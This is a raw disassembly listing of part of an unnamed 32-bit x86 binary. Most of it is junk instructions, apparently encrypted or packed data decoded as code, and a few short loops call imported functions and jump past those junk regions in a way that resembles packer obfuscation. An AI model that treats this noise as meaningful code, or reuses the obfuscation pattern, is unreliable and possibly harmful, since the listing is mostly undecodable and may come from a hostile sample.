  4074b5:	pop    ebp
  4074b6:	mov    eax,0x3857b38a
  4074bb:	mov    WORD PTR [ebx],cs
  4074bd:	mov    dl,0x97
  4074bf:	dec    edi
  4074c0:	mov    ds:0x3ea1a87d,al
  4074c5:	or     cl,BYTE PTR [edx]
  4074c7:	sbb    bh,BYTE PTR [ebp+0x49c89448]
  4074cd:	hlt    
  4074ce:	mov    ecx,0x8a42aaa0
  4074d3:	mov    eax,ds:0xeea5c413
  4074d8:	pop    ecx
  4074d9:	fiadd  WORD PTR [edi]
  4074db:	and    BYTE PTR [edx],dh
  4074dd:	mov    dh,0xbe
  4074df:	push   ds
  4074e0:	jl     0x4074b2
  4074e2:	int3   
  4074e3:	shr    ebx,0x5b
  4074e6:	mov    cl,0xa4
  4074e8:	mov    edx,0x6ade96d9
  4074ed:	sbb    DWORD PTR ds:0x7633d4e9,esp
  4074f3:	mov    ?,WORD PTR [edx+0x2e]
  4074f6:	add    eax,0x7558e3c4
  4074fb:	inc    edi
  4074fc:	cmp    edi,ecx
  4074fe:	sbb    edi,DWORD PTR [esi+0x14]
  407501:	test   al,0x36
  407503:	pushf  
  407504:	lods   eax,DWORD PTR ds:[esi]
  407505:	mov    edx,0xb814bfef
  40750a:	(bad)  
  40750c:	sbb    DWORD PTR [ecx+0x619a4e8],esp
  407512:	enter  0xf12e,0x25
  407516:	xchg   edx,eax
  407517:	ror    BYTE PTR [edx],0xa6
  40751a:	js     0x407591
  40751c:	sbb    DWORD PTR gs:[ebp-0x21afb91d],ebx
  407523:	xchg   esp,eax
  407524:	nop
  407525:	jle    0x407530
  407527:	xchg   cl,dl
  407529:	out    0xdf,eax
  40752b:	cwde   
  40752c:	(bad)  
  40752d:	push   0xe0148ffa
  407532:	out    dx,eax
  407533:	mov    dl,cl
  407535:	ds int 0x47
  407538:	push   DWORD PTR [ebp+0x1d]
  40753b:	call   0x47900d68
  407540:	cmp    bh,BYTE PTR es:0x74ba2782
  407547:	out    dx,al
  407548:	test   BYTE PTR [edx+0x5b],dh
  40754b:	iret   
  40754c:	pop    edi
  40754d:	dec    esi
  40754e:	fs mov edx,0xa4284150
  407554:	enter  0xd958,0x83
  407558:	jnp    0x4074de
  40755a:	mov    edx,?
  40755c:	dec    ecx
  40755d:	jp     0x40752f
  40755f:	pop    ds
  407560:	mov    esi,0x919e91b7
  407565:	(bad)  
  407566:	fstp   QWORD PTR [eax]
  407568:	jno    0x4075e7
  40756a:	and    bl,bh
  40756c:	or     al,0x5d
  40756e:	jg     0x407500
  407570:	out    dx,eax
  407571:	mov    bh,0xd6
  407573:	std    
  407574:	scas   al,BYTE PTR es:[edi]
  407575:	or     bl,BYTE PTR [edx-0x7386a0e2]
  40757b:	sub    BYTE PTR [edi+0x3f],dl
  40757e:	(bad)
  407581:	sbb    esi,0xdeca27b3
  407587:	or     esi,edx
  407589:	push   ebx
  40758a:	add    BYTE PTR [ecx],bh
  40758c:	imul   esi,DWORD PTR [eax-0x2ec08914],0xffffffe6
  407593:	sbb    ah,BYTE PTR [ecx-0x13178f3]
  407599:	(bad)  
  40759a:	push   ecx
  40759b:	adc    al,0x8c
  40759d:	in     al,0x53
  40759f:	sbb    bh,BYTE PTR [esi]
  4075a1:	pushf  
  4075a2:	jle    0x4075e1
  4075a4:	cvtps2pd xmm5,QWORD PTR [esi-0x59]
  4075a8:	clc    
  4075a9:	push   ss
  4075aa:	push   eax
  4075ab:	dec    esi
  4075ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ad:	bound  esi,QWORD PTR [esi-0x6d]
  4075b0:	jge    0x407619
  4075b2:	lods   al,BYTE PTR ds:[esi]
  4075b3:	icebp  
  4075b4:	push   0x15
  4075b6:	mov    esp,edi
  4075b8:	add    ah,cl
  4075ba:	sbb    ebx,edx
  4075bc:	cli    
  4075bd:	cmp    eax,ebp
  4075bf:	popa   
  4075c0:	push   ebx
  4075c1:	jle    0x40763d
  4075c3:	mov    edx,0xa450b41d
  4075c8:	jnp    0x4075f3
  4075ca:	sahf   
  4075cb:	in     eax,dx
  4075cc:	xor    BYTE PTR [ebp-0x5b2d6c70],0xc
  4075d3:	fidiv  DWORD PTR [ebx+ebx*4+0x1320f410]
  4075da:	xor    al,bh
  4075dc:	dec    eax
  4075dd:	mov    ds:0xb4777b58,al
  4075e2:	(bad)  
  4075e3:	sub    BYTE PTR ds:0x1b57e7f1,bl
  4075e9:	into   
  4075ea:	jmp    0xea97f6ac
  4075ef:	sbb    esi,esi
  4075f1:	lods   al,BYTE PTR ds:[esi]
  4075f2:	and    ebp,DWORD PTR ds:0x68ce6792
  4075f8:	nop
  4075f9:	or     eax,0xa5028ffa
  4075fe:	add    eax,0x51015330
  407603:	retf   
  407604:	xchg   esi,eax
  407605:	in     al,0x1
  407607:	jle    0x407599
  407609:	fucomi st,st(7)
  40760b:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40760d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40760e:	xchg   ecx,eax
  40760f:	aam    0x3d
  407611:	cld    
  407612:	mov    edx,0x62c35e3b
  407617:	dec    esi
  407618:	adc    edi,esi
  40761a:	cmp    BYTE PTR [edx-0x67],0xf
  40761e:	test   bl,ch
  407620:	sbb    al,BYTE PTR [eax]
  407622:	add    BYTE PTR [ebx-0x17],dl
  407625:	pop    esi
  407626:	pop    ss
  407627:	add    BYTE PTR [eax],al
  407629:	and    DWORD PTR ds:0x42ec4b,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42ec4b
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42ec4b,edx
  407647:	cmp    DWORD PTR ds:0x42ec4b,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42ec4b,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42e933
  40766a:	cmp    DWORD PTR ds:0x42ec4b,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42ec4b
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42ec4b,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	pop    esp
  4076a5:	aas    
  4076a6:	imul   eax,DWORD PTR [eax+0x41],0xffffffc2
  4076aa:	jle    0x40772a
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x407635
  4076b1:	sti    
  4076b2:	inc    ecx
  4076b3:	push   edi
  4076b4:	in     eax,dx
  4076b5:	xor    dh,bh
  4076b7:	loopne 0x4076a4
  4076b9:	cli    
  4076ba:	push   eax
  4076bb:	rol    BYTE PTR ds:0x2c848584,cl
  4076c1:	inc    eax
  4076c2:	lea    eax,[esi+0x50654793]
  4076c8:	mov    edx,ecx
  4076ca:	push   esp
  4076cb:	ins    DWORD PTR es:[edi],dx
  4076cc:	or     BYTE PTR [edi+0x1d689c23],bl
  4076d2:	mov    eax,DWORD PTR [edx+ecx*1]
  4076d5:	xor    BYTE PTR [ecx],bl
  4076d7:	out    0x99,eax
  4076d9:	push   ecx
  4076da:	mov    ah,0x90
  4076dc:	cwde   
  4076dd:	cmp    eax,DWORD PTR [ebp+0x11ba4de4]
  4076e3:	mov    bl,0x46
  4076e5:	icebp  
  4076e6:	fistp  QWORD PTR [edi]
  4076e8:	sub    al,0xa4
  4076ea:	das    
  4076eb:	xchg   ebp,eax
  4076ec:	icebp  
  4076ed:	fldenv [esi+0x77]
  4076f0:	lahf   
  4076f1:	and    dl,dh
  4076f3:	push   ecx
  4076f4:	gs iret 
  4076f6:	ret    
  4076f7:	inc    esp
  4076f8:	mov    al,ds:0xe7baed61
  4076fd:	daa    
  4076fe:	dec    ecx
  4076ff:	into   
  407700:	push   ss
  407701:	and    eax,0x289458f8
  407706:	bound  ebx,QWORD PTR [ecx]
  407708:	jmp    0x4076a6
  40770a:	daa    
  40770b:	ins    DWORD PTR es:[edi],dx
  40770c:	push   edx
  40770d:	ret    0x3d05
  407710:	pop    ds
  407711:	jmp    0x4f5c:0x4c74273
  407718:	push   edx
  407719:	call   0xea0e0632
  40771e:	sahf   
  40771f:	lds    esi,FWORD PTR [edi+0x49cf70a6]
  407725:	jnp    0x407706
  407727:	push   esp
  407728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407729:	int3   
  40772a:	pop    esi
  40772b:	dec    ecx
  40772c:	fs cwde 
  40772e:	xchg   edx,eax
  40772f:	adc    BYTE PTR [ebp+0x303c24ff],bl
  407735:	sub    DWORD PTR ds:0x2cdf0cd3,0xffffff87
  40773c:	sbb    bl,dh
  40773e:	outs   dx,BYTE PTR ds:[esi]
  40773f:	jmp    0x35680e8a
  407744:	adc    al,0xe4
  407746:	adc    eax,0x5c6f5d49
  40774b:	jp     0x407709
  40774d:	out    0x52,al
  40774f:	test   al,0x28
  407751:	das    
  407752:	fld    DWORD PTR ds:0x78e3671b
  407758:	inc    esp
  407759:	jb     0x4076ec
  40775b:	in     eax,0xcf
  40775d:	push   edi
  40775e:	pop    eax
  40775f:	inc    esp
  407760:	push   cs
  407761:	add    eax,ebx
  407763:	mov    ecx,0xe886186
  407768:	mul    dh
  40776a:	fild   QWORD PTR [edi]
  40776c:	mov    ebx,0xa011010b
  407771:	ret    
  407772:	imul   ebp,edx,0x4d
  407775:	leave  
  407776:	inc    ecx
  407777:	shl    DWORD PTR [esi],0xa6
  40777a:	jnp    0x407745
  40777c:	mov    WORD PTR [edx],es
  40777e:	or     al,0xdc
  407780:	gs cdq 
  407782:	cmp    DWORD PTR [ebp+0x4de27d70],ebx
  407788:	retf   
  407789:	cmp    esi,ebp
  40778b:	jle    0x407753
  40778d:	dec    edi
  40778e:	push   ds
  40778f:	pop    edx
  407790:	add    al,BYTE PTR [edi]
  407792:	xchg   edx,eax
  407793:	repnz stos DWORD PTR es:[edi],eax
  407795:	scas   al,BYTE PTR es:[edi]
  407796:	(bad)  
  407797:	xchg   ecx,eax
  407798:	cmp    BYTE PTR [eax+0x614affaf],cl
  40779e:	clc    
  40779f:	push   ss
  4077a0:	int    0x11
  4077a2:	mov    ah,0x1f
  4077a4:	outs   dx,DWORD PTR ds:[esi]
  4077a5:	mov    cl,0x23
  4077a7:	jl     0x40778e
  4077a9:	adc    ebx,edx
  4077ab:	and    cl,bl
  4077ad:	das    
  4077ae:	dec    edx
  4077af:	in     eax,0x68
  4077b1:	js     0x4077e3
  4077b3:	fadd   QWORD PTR ds:0xcb4474be
  4077b9:	xor    al,BYTE PTR [ecx]
  4077bb:	retf   
  4077bc:	imul   DWORD PTR [esi-0x2940c151]
  4077c2:	shr    BYTE PTR [ebx+0x3b],1
  4077c5:	je     0x4077e9
  4077c7:	xchg   DWORD PTR [edx+edi*4-0x2],ebp
  4077cb:	int    0xc5
  4077cd:	jnp    0x407752
  4077cf:	mov    cl,al
  4077d1:	add    al,0x72
  4077d3:	out    0x63,eax
  4077d5:	nop
  4077d6:	sub    eax,0x2f2e854d
  4077db:	sub    bh,BYTE PTR [edx+0x46]
  4077de:	mov    ds:0x16830ca0,al
  4077e3:	sub    edi,esp
  4077e5:	out    0x22,eax
  4077e7:	pop    es
  4077e8:	mov    ?,ebx
  4077ea:	div    BYTE PTR [eax+0x7ec3e22d]
  4077f0:	rcl    BYTE PTR [edi+eiz*2-0x25],cl
  4077f4:	xchg   edi,eax
  4077f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f6:	xchg   bx,ax
  4077f8:	out    dx,al
  4077f9:	jo     0x407868
  4077fb:	xor    ch,BYTE PTR [edx-0x56]
  4077fe:	mov    DWORD PTR [esi-0x7b0d6d17],eax
  407804:	es adc al,0x22
  407807:	mov    cs,WORD PTR [edx+0x30]
  40780a:	clc    
  40780b:	fld    QWORD PTR [edi+0x2eaababd]
  407811:	dec    esi
  407812:	jmp    0x40784a
  407814:	addr16 pop ebx
  407816:	daa    
  407817:	lahf   
  407818:	outs   dx,DWORD PTR ds:[esi]
  407819:	fs in  al,dx
  40781b:	push   edi
  40781c:	sbb    bl,BYTE PTR [edx]
  40781e:	pop    ecx
  40781f:	shl    DWORD PTR [edi+ecx*4+0x6e],0xf3
  407824:	xchg   ebp,eax
  407825:	mov    bl,0xcb
  407827:	jns    0x40782a
  407829:	dec    edi
  40782a:	mul    DWORD PTR [esi-0x7592338b]
  407830:	test   eax,0x1ef185dc
  407835:	(bad)  
  407836:	(bad)  [ecx]
  407838:	and    DWORD PTR [eax+eax*8-0x20],0xffffff9e
  40783d:	jbe    0x407820
  40783f:	adc    al,0x7d
  407841:	popf   
  407842:	ret    
  407843:	push   eax
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x4302c9,0x43034f
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x4302ed,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e644,0x1e
  407871:	cmp    DWORD PTR ds:0x42e644,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e644,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42e937
  407896:	mov    edi,DWORD PTR ds:0x42e644
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e644,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42ec4f
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x4302bd,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x4302bd
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x4302bd,ebx
  4078d6:	cmp    DWORD PTR ds:0x4302bd,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eaa7
  4078f1:	cmp    DWORD PTR ds:0x4302bd,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	(bad)  
  407942:	fimul  DWORD PTR [ebx-0x3f221a08]
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x4079cc
  40794f:	inc    ebx
  407950:	sbb    edi,DWORD PTR [eax-0x4ae71f93]
  407956:	pop    ebp
  407957:	pop    edx
  407958:	cmp    eax,edi
  40795a:	aas    
  40795b:	fs ins BYTE PTR es:[edi],dx
  40795d:	adc    esp,DWORD PTR [ecx-0x469bf98a]
  407963:	das    
  407964:	pusha  
  407965:	in     eax,0xd8
  407967:	xor    al,0x5d
  407969:	test   eax,0x250f9fa3
  40796e:	cmc    
  40796f:	adc    eax,DWORD PTR [bp+si+0x33f9]
  407974:	stos   DWORD PTR es:[edi],eax
  407975:	inc    edi
  407976:	cs mov edi,0xc8a8b0dd
  40797c:	mov    edi,0x716dfde0
  407981:	(bad)  [ebp-0x57173d1e]
  407987:	cmp    al,0xe2
  407989:	and    DWORD PTR [eax+ecx*4],esp
  40798c:	shl    BYTE PTR gs:[eax-0x61],0xf5
  407991:	push   es
  407992:	sbb    eax,0x335c0aaa
  407997:	pop    edx
  407998:	scas   al,BYTE PTR es:[edi]
  407999:	sbb    DWORD PTR [ebx+0x66],ebp
  40799c:	mov    ebx,0xbf03dad0
  4079a1:	sbb    eax,DWORD PTR [ebx]
  4079a3:	pop    edi
  4079a4:	iret   
  4079a5:	xor    al,0x40
  4079a7:	jecxz  0x4079fd
  4079a9:	rcl    ecx,1
  4079ab:	jmp    0x23021466
  4079b0:	sub    al,0xf0
  4079b2:	push   edx
  4079b3:	mov    eax,ds:0x5dbc4342
  4079b8:	cmp    eax,DWORD PTR [ebx+0x1a]
  4079bb:	push   ds
  4079bc:	lds    ebp,FWORD PTR ds:0xd544684c
  4079c2:	imul   BYTE PTR [ebx+0x1791098a]
  4079c8:	hlt    
  4079c9:	std    
  4079ca:	inc    ebx
  4079cb:	pop    es
  4079cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079cd:	(bad)
  4079d2:	arpl   WORD PTR [ebx-0x56642667],cx
  4079d8:	adc    BYTE PTR [ebp-0xe8fdd9a],bh
  4079de:	adc    eax,0x1052987e
  4079e3:	mov    bl,0xab
  4079e5:	pop    ebx
  4079e6:	jle    0x407a03
  4079e8:	leave  
  4079e9:	jle    0x4079c3
  4079eb:	mov    esp,0x4e12fb9a
  4079f0:	ja     0x407a32
  4079f2:	jge    0x407a6d
  4079f4:	mov    ecx,0x1716fc57
  4079f9:	adc    dh,BYTE PTR [esi]
  4079fb:	pop    edi
  4079fc:	jns    0x407a44
  4079fe:	xchg   dh,dh
  407a00:	add    DWORD PTR [esi+eiz*4-0x47c3b05d],esp
  407a07:	pusha  
  407a08:	adc    ch,dh
  407a0a:	and    DWORD PTR [edx+0x26],edx
  407a0d:	fmulp  st(4),st
  407a0f:	cli    
  407a10:	add    al,0x48
  407a12:	pop    ecx
  407a13:	addr16 int3 
  407a15:	or     eax,ecx
  407a17:	sub    eax,0x2e56458e
  407a1c:	imul   ecx,DWORD PTR [ebx+0x9e233fa],0x59ff688b
  407a26:	cmc    
  407a27:	arpl   WORD PTR [eax+ebx*1],ax
  407a2a:	mov    ah,0xcd
  407a2c:	(bad)  
  407a2d:	jg     0x407a16
  407a2f:	rcr    esi,cl
  407a31:	mov    ds:0x3129ac6d,eax
  407a36:	pop    ebp
  407a37:	inc    ebx
  407a38:	iret   
  407a39:	int    0x46
  407a3b:	dec    edx
  407a3c:	dec    eax
  407a3d:	rcl    BYTE PTR [esi],0x2b
  407a40:	sahf   
  407a41:	pop    esi
  407a42:	aam    0x8d
  407a44:	sub    al,0xa0
  407a46:	inc    edx
  407a47:	ins    BYTE PTR es:[edi],dx
  407a48:	push   esi
  407a49:	inc    ecx
  407a4a:	fcmovnu st,st(1)
  407a4c:	leave  
  407a4d:	adc    al,0xef
  407a4f:	(bad)  
  407a50:	in     eax,dx
  407a51:	test   al,0xc5
  407a53:	mov    edx,0x8a2d8107
  407a58:	bound  edi,QWORD PTR [ecx-0x392491ef]
  407a5e:	sbb    eax,0x37ac494f
  407a63:	adc    eax,0xb87c8783
  407a68:	stos   BYTE PTR es:[edi],al
  407a69:	and    DWORD PTR [edi+0x705a5c9b],ebp
  407a6f:	dec    edx
  407a70:	ds nop
  407a72:	mov    dh,0x21
  407a74:	add    BYTE PTR [esi+0x5d],bh
  407a77:	push   ds
  407a78:	jbe    0x407a49
  407a7a:	mov    edi,0x7757ca6d
  407a7f:	mov    esi,0x16012552
  407a84:	pop    es
  407a85:	ja     0x407a27
  407a87:	gs out dx,al
  407a89:	pop    es
  407a8a:	xlat   BYTE PTR ds:[ebx]
  407a8b:	jmp    0x59d87dd2
  407a90:	dec    ebx
  407a91:	and    dl,BYTE PTR [eax-0x193eb588]
  407a97:	aas    
  407a98:	mov    esi,DWORD PTR [ebx-0x68]
  407a9b:	lods   al,BYTE PTR ds:[esi]
  407a9c:	and    ebx,DWORD PTR [edi]
  407a9e:	mov    ds:0x19c86fba,eax
  407aa3:	in     eax,0xf2
  407aa5:	dec    esi
  407aa6:	xchg   edi,eax
  407aa7:	ins    BYTE PTR es:[edi],dx
  407aa8:	or     bl,BYTE PTR [esi+0x6268dad9]
  407aae:	push   ss
  407aaf:	test   ecx,esi
  407ab1:	cli    
  407ab2:	sbb    eax,0x1bc8cdfe
  407ab7:	arpl   ax,cx
  407ab9:	mov    dh,0x4e
  407abb:	inc    DWORD PTR [eax+eax*2+0x65082454]
  407ac2:	rcr    BYTE PTR [edx-0xa],cl
  407ac5:	mov    BYTE PTR [edx],dh
  407ac7:	cmp    eax,0xd519131a
  407acc:	addr16 jbe 0x407a6f
  407acf:	stos   DWORD PTR es:[edi],eax
  407ad0:	arpl   WORD PTR [esi],ax
  407ad2:	jecxz  0x407a91
  407ad4:	mov    ebx,0xa1df6550
  407ad9:	jbe    0x407ae7
  407adb:	loope  0x407a60
  407add:	push   0x5f
  407adf:	fwait
  407ae0:	sbb    dl,BYTE PTR [ecx-0x75]
  407ae3:	pop    ebp
  407ae4:	lock sub ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi-0x55833836]
  407b11:	cs imul eax,ecx,0x7f8a7e7e
  407b18:	jle    0x407b98
  407b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b1b:	cmp    edi,DWORD PTR [edx+0x4a]
  407b1e:	jns    0x407ab1
  407b20:	call   0x1fa329e3
  407b25:	inc    eax
  407b26:	es (bad) 
  407b28:	mov    WORD PTR [ecx-0x1bdbd21e],?
  407b2e:	sub    dh,BYTE PTR [ecx+0x4a]
  407b31:	mov    ss,WORD PTR [ecx-0x5a]
  407b34:	xor    bl,bh
  407b36:	cs jge 0x407acd
  407b39:	pushf  
  407b3a:	in     eax,0x59
  407b3c:	cdq    
  407b3d:	mov    ds:0xf530a5d7,eax
  407b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b43:	cmp    eax,DWORD PTR [edi+0x3f7a85c5]
  407b49:	pop    esp
  407b4a:	ret    
  407b4b:	adc    al,0x47
  407b4d:	sbb    al,0xd7
  407b4f:	scas   eax,DWORD PTR es:[edi]
  407b50:	mov    esp,0x88038568
  407b55:	inc    esp
  407b56:	dec    ecx
  407b57:	mov    edi,0xfea2e574
  407b5c:	inc    esi
  407b5d:	in     al,dx
  407b5e:	or     DWORD PTR [edx+0x756899],esp
  407b64:	(bad)  
  407b65:	dec    edi
  407b66:	xchg   esi,eax
  407b67:	fisttp DWORD PTR [ecx+0x3f]
  407b6a:	mov    cl,0x90
  407b6c:	adc    DWORD PTR [edi-0x116ada52],ebp
  407b72:	clc    
  407b73:	jg     0x407bb0
  407b75:	test   eax,0x181bf58d
  407b7a:	sbb    ebx,DWORD PTR [edi+0x86458c8]
  407b80:	sbb    DWORD PTR [esi],esi
  407b82:	out    dx,eax
  407b83:	mov    edx,0xd9f042c7
  407b88:	mov    eax,ds:0x4963312d
  407b8d:	xor    esi,ecx
  407b8f:	fadd   st(0),st
  407b91:	sub    BYTE PTR [esi+0x4be9b055],0x9c
  407b98:	xchg   ebx,edi
  407b9a:	or     BYTE PTR [ebx+0x4f1ea6ee],0xe7
  407ba1:	test   dh,dh
  407ba3:	test   BYTE PTR ds:0xaca4878d,bl
  407ba9:	bswap  edi
  407bab:	cmc    
  407bac:	mov    eax,0x5b248b15
  407bb1:	push   eax
  407bb2:	dec    eax
  407bb3:	jo     0x407b9c
  407bb5:	sahf   
  407bb6:	jl     0x407c21
  407bb8:	mov    ebx,0x223f6b14
  407bbd:	mov    esp,0x41adeb6a
  407bc2:	mul    BYTE PTR [ebp+0x3bc535ac]
  407bc8:	inc    esp
  407bc9:	push   cs
  407bca:	or     DWORD PTR [edi-0x645a6e6a],ebx
  407bd0:	add    bh,BYTE PTR ds:0x55e63784
  407bd6:	or     BYTE PTR [ebp-0x7ab9f9fd],dh
  407bdc:	jmp    0x407c3c
  407bde:	xchg   BYTE PTR [edi+0x27],dh
  407be1:	add    esi,edx
  407be3:	pop    esp
  407be4:	jo     0x407bc0
  407be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407be8:	cld    
  407be9:	push   0x9d4a73f
  407bee:	in     eax,0xb
  407bf0:	in     eax,0x44
  407bf2:	sub    BYTE PTR [edi+0x25],0x8a
  407bf6:	add    eax,0x7ee4558
  407bfb:	(bad)  
  407bfc:	pop    ss
  407bfd:	jno    0x407c43
  407bff:	sbb    ebp,ecx
  407c01:	call   0x3457f251
  407c06:	lock sub BYTE PTR [esp+edi*2-0x19],dl
  407c0b:	or     DWORD PTR [eax],eax
  407c0d:	and    eax,0x5959bc8e
  407c12:	aaa    
  407c13:	xlat   BYTE PTR ds:[ebx]
  407c14:	xchg   ecx,eax
  407c15:	jnp    0x407c5c
  407c17:	(bad)  
  407c18:	int3   
  407c19:	mov    eax,ds:0xd0b27838
  407c1e:	ins    BYTE PTR es:[edi],dx
  407c1f:	(bad)
  407c25:	sbb    eax,0x46452d66
  407c2a:	stos   DWORD PTR es:[edi],eax
  407c2b:	iret   
  407c2c:	js     0x407bbb
  407c2e:	sub    bh,BYTE PTR [ecx+0x46c3844f]
  407c34:	shl    BYTE PTR [edi+edx*8-0x41580503],cl
  407c3b:	loopne 0x407bd4
  407c3d:	push   esi
  407c3e:	cmp    BYTE PTR [ebx],ah
  407c40:	xor    WORD PTR [ebp-0x28051f6b],ax
  407c47:	jbe    0x407c64
  407c49:	imul   esp,DWORD PTR [ecx+0x1f1b3b5a],0x8d48407f
  407c53:	sar    ebp,cl
  407c55:	pop    esi
  407c56:	xchg   ebx,eax
  407c57:	sbb    ch,BYTE PTR [ebp-0x40]
  407c5a:	inc    eax
  407c5b:	sub    DWORD PTR [ecx-0x5cb4890c],edx
  407c61:	mov    ds:0xe579e5d,eax
  407c66:	fisub  WORD PTR fs:[ebx+ebx*8]
  407c6a:	test   BYTE PTR [eax],dl
  407c6c:	dec    ebp
  407c6d:	push   ebp
  407c6e:	xchg   esp,eax
  407c6f:	cmp    DWORD PTR [esi+ebx*2],esi
  407c72:	stos   DWORD PTR es:[edi],eax
  407c73:	push   ecx
  407c74:	xor    DWORD PTR [ecx-0x32],eax
  407c77:	add    BYTE PTR [edi+0x63],0x5c
  407c7b:	xchg   BYTE PTR [eax],ch
  407c7d:	jne    0x407c05
  407c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c80:	mov    ss,edi
  407c82:	push   edi
  407c83:	in     eax,0xa4
  407c85:	jae    0x407cd6
  407c87:	mov    ecx,DWORD PTR [ebx]
  407c89:	mov    es:0x8b4a503d,al
  407c8f:	popw   ss
  407c91:	icebp  
  407c92:	or     ah,BYTE PTR [eax+0x1f3202cd]
  407c98:	push   ds
  407c99:	adc    eax,0x116016eb
  407c9e:	(bad)
  407ca1:	sbb    eax,0x32dfa174
  407ca6:	dec    edi
  407ca7:	stc    
  407ca8:	call   0x3399:0x9067096e
  407caf:	shl    BYTE PTR [ebx],1
  407cb1:	clc    
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax+0x7e449ae6]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407d35
  407ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce2:	gs push 0x68
  407ce5:	(bad)  
  407ce6:	mov    ebx,DWORD PTR [ecx-0x40bc42bb]
  407cec:	add    eax,0x110c0c04
  407cf1:	out    dx,al
  407cf2:	mov    ebx,0x48155173
  407cf7:	cmp    BYTE PTR [eax-0x70],dl
  407cfa:	inc    ebx
  407cfb:	ja     0x407ce7
  407cfd:	mov    bh,0x30
  407cff:	sub    BYTE PTR [ebx-0x3e],ah
  407d02:	popa   
  407d03:	cmp    bh,BYTE PTR [edx+0x744636ed]
  407d09:	js     0x407d68
  407d0b:	cmp    al,0x44
  407d0d:	push   ss
  407d0e:	jne    0x407d69
  407d10:	push   eax
